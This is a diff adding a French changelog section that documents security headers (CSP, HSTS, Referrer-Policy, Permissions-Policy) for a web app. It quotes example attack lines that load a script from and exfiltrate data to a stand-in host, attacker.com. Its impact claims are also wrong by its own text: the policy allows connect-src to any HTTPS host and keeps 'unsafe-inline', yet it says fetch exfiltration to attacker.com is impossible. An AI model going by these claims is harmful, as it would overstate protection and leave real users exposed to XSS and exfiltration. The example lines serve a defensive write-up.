@@ -112,6 +112,76 @@ marchand. 3 findings CRITIQUES corrigés :
 - `80630d4` audit(transactions) V: IDOR appointment scope + whitelists type/method + bounds amount/desc/note + date validation + error hygiene
 - `0379c64` audit(referrals) W: normalisation anti-self-referral + PIN admin config + caps metier + error hygiene
 - `111da9d` audit(loyalty) X: PIN admin config/delete + caps metier + cap stamps_to_add + normalisation email
+- `<Y-hash>` security(headers) Y: CSP + HSTS + Referrer-Policy + Permissions-Policy (frontend Vercel + backend middleware)
+
+### 🔒 Security headers — commit Y
+
+**Fichiers** : `frontend/vercel.json` (headers HTML côté Vercel),
+`backend/src/index.js` (middleware API côté Render).
+
+**Protections ajoutées** :
+
+- **Content-Security-Policy (CSP)** côté frontend (vercel.json) :
+  - `frame-ancestors 'none'` → anti-clickjacking strict (plus fort que
+    `X-Frame-Options`, couvre le cas où un futur dev retire ce header).
+  - `base-uri 'self'` → bloque `<base>` injection (technique XSS rare
+    mais effective).
+  - `object-src 'none'` → bloque Flash/plugins (vecteur XSS legacy).
+  - `form-action 'self'` → un formulaire ne peut submit que vers le
+    même domaine.
+  - `script-src` : whitelist `cdn.tailwindcss.com`, `js.stripe.com`,
+    `accounts.google.com`. `'unsafe-inline'` + `'unsafe-eval'` requis
+    par Tailwind CDN runtime et inline config dans `index.html` — à
+    durcir si on passe Tailwind en build-time.
+  - `connect-src 'self' https: wss:` : permet API Render + WebSocket
+    éventuel. Restreint à HTTPS (bloque `http://attacker.com`).
+  - `upgrade-insecure-requests` : force HTTPS sur toutes les
+    sous-requêtes.
+
+- **Strict-Transport-Security (HSTS)** : `max-age=31536000;
+  includeSubDomains` — force HTTPS sur le domaine + sous-domaines
+  pendant 1 an. Protège contre downgrade man-in-the-middle.
+
+- **Referrer-Policy** : `strict-origin-when-cross-origin` — ne leak pas
+  l'URL complète (path + query) aux services tiers quand l'utilisateur
+  clique sur un lien externe ou charge une image distante.
+
+- **Permissions-Policy** : `geolocation=(), microphone=(), camera=(),
+  usb=(), autoplay=(), payment=(self "https://js.stripe.com")` — coupe
+  tous les accès API sensibles par défaut. Seul Stripe peut invoquer
+  l'API Payment Request.
+
+- **X-Content-Type-Options: nosniff** (déjà présent, conservé).
+
+- **X-Frame-Options: DENY** (déjà présent, redondant avec
+  `frame-ancestors 'none'` mais utile pour les vieux navigateurs).
+
+- **Backend middleware** : mêmes headers transverses (nosniff, DENY,
+  HSTS, Referrer, Permissions) sur chaque réponse API — protection
+  même si quelqu'un hit directement `api.flowia.../` dans le navigateur
+  (pages d'erreur HTML type 404 Express par défaut).
+
+### Impact sécu
+
+Si un jour un `dangerouslySetInnerHTML` ou une faille XSS est introduite
+(audit R a confirmé qu'il n'y en a pas actuellement), la CSP limite
+fortement ce que l'attaquant peut faire :
+- impossible d'injecter `<script src="https://attacker.com/x.js">`
+- impossible de `fetch('https://attacker.com/exfil', ...)`
+- impossible de créer des iframes cachées
+- impossible d'installer un `<base href="...">` pour détourner les URLs
+  relatives
+
+### Non corrigé / tradeoffs assumés
+
+- **`'unsafe-inline'` + `'unsafe-eval'`** obligatoires pour Tailwind CDN
+  runtime + inline config dans `index.html`. Durcir = passer Tailwind en
+  build-time (refactor). Noté pour plus tard.
+- **Nonce CSP** non implémenté (nécessiterait SSR ou post-processing du
+  build Vite). `'unsafe-inline'` compense pragmatiquement.
+- **Report-URI** non configuré — on pourrait ajouter un
+  `report-to` pour recevoir les violations en prod, mais nécessite
+  endpoint dédié.
 
 ### 🔒 Audit loyalty.js — commit X (dernier P1)
 
